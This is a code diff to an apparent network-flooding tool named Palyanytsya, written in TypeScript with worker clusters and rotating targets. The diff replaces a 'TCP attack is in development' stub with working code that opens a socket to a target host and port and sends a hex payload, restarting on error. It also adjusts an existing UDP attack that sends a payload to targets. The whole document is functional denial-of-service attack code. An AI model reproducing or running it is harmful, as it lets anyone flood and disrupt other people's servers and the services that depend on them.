@@ -2,11 +2,13 @@ import got, { RequestError } from 'got-cjs';
 import Colors from 'colors';
 import * as DGram from 'dgram';
 import delay from 'delay';
+import net from 'net';
 import cluster from 'cluster';
 import { getDefaultHeaders, getSearchParams } from './util';
 import { logError, logRainbow, logInfo, logSuccess } from './log';
 import {
   PAYLOAD,
+  HEX_PAYLOAD,
   WORKERS_COUNT,
   CHANGE_TARGET_DELAY_MIN,
   AVAILABLE_PROTOCOLS,
@@ -162,21 +164,37 @@ class Palyanytsya {
   }
 
   async tcpAttack () {
-    logInfo('TCP Attack is in development. Palyanytsya will be restarted with another target');
+    const that = this;
+    const client = new net.Socket();
+    const { path = '' } = this.target || {}; 
+    
+    await delay(200);
 
-    await this.restart();
+    client.on('error', async () => {
+      logError(`Error occurred while TCP attack`);
+      await this.restart();
+    });
+
+    client.on('data', () => { // 'data' is an event handler for the client socket, what the server sent
+      logInfo(`PID-[${process.pid}]-Date-[${new Date().toLocaleString('en-US', { hour12: false })}]-The payload has been send to ${path.trim()}${that.port ? `:${that.port}` : ''} via ${that.targetProtocol.toUpperCase()} protocol.`);
+      client.destroy(); // Close the client socket completely
+    }); 
+
+    client.connect(Number(this.port), path.trim(), () => {
+        console.log("Connected");
+        client.write(HEX_PAYLOAD); //This will send the byte buffer over TCP
+    });
   }
 
   async udpAttack () {
+    const { path = '' } = this.target || {}; 
     const udpClient = DGram.createSocket('udp4');
+
+    await delay(200);
 
     udpClient.on('error', () => {
       logError(`Error occurred while UDP attack`);
     });
-
-    await delay(200);
-
-    const { path = '' } = this.target || {}; 
 
     udpClient.send(PAYLOAD, Number(this.port), path.trim(), () => {
       udpClient.close();
